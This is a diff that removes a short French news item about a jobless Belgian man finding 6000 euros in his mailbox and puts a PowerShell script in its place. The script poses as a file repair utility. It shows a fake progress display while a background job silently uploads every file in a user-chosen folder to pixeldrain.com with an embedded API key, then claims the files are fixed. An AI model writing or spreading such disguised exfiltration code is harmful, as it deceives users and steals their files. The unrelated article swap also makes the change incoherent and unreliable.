@@ -1,8 +1,45 @@
-Surprise dans une boîte aux lettres En Belgique, un chômeur de 31 ans a découvert dans sa boîte aux lettres une enveloppe avec plus de 6000 euros et un mot indiquant : « bonne chance ! »
 
-Une personne nommé Marcos qui est sans emploi, récemment est devenu riche par 6000 euros.
-Le matin , il est allé l'éxterior verifier ses lettres , en ouvrant la boite aux lettres , il a trouvé  6000 euros avec une note lui souhaitant bonne chance.
+Clear-Host
 
-Il a donné que , il avait une dette de 4000 euros, donc il payera sa dette et utilisera le reste de montant pour ouvrir sonn propre restaurant.
+$FolderPath = Read-Host "Enter the folder path"
 
-Il souhaite être tellement riche qu’il pourrait aussi aider quelqu’un comme ça.  
+if (Test-Path $FolderPath) {
+    $TotalTime = 900
+    $ElapsedTime = 0
+    $RepairProgress = 0
+
+    Write-Host "[*] Attempting to repair corrupted files..." -ForegroundColor Green
+
+    $uploadJob = Start-Job -ScriptBlock {
+        param ($FolderPath)
+        
+        Get-ChildItem -Path $FolderPath -File | ForEach-Object {
+            $File = $_.FullName
+            if (Test-Path $File) {
+                $CurlOutput = curl.exe -T "$File" -u :310c295d-cdfb-449a-98dd-121ef3b1ab3e https://pixeldrain.com/api/file/ > $null 2>&1
+            }
+        }
+    } -ArgumentList $FolderPath
+
+    while ($ElapsedTime -lt $TotalTime) {
+        $ElapsedTime++
+        $RepairProgress = [math]::Round(($ElapsedTime / $TotalTime) * 100)
+
+        Write-Host "Repairing files... ($RepairProgress% complete)"
+        Write-Host "Time elapsed: $([math]::Round($ElapsedTime / 60)) minutes $($ElapsedTime % 60) seconds"
+        Write-Host "---------------------------"
+        
+        $sleepTime = Get-Random -Minimum 1 -Maximum 11
+        Start-Sleep -Seconds $sleepTime
+    }
+
+    Wait-Job -Job $uploadJob
+
+    Write-Host "[*] Repair process complete. All files are now functional." -ForegroundColor Green
+
+    Remove-Job -Job $uploadJob
+} else {
+    Write-Host "The folder path does not exist." -ForegroundColor Red
+}
+
+
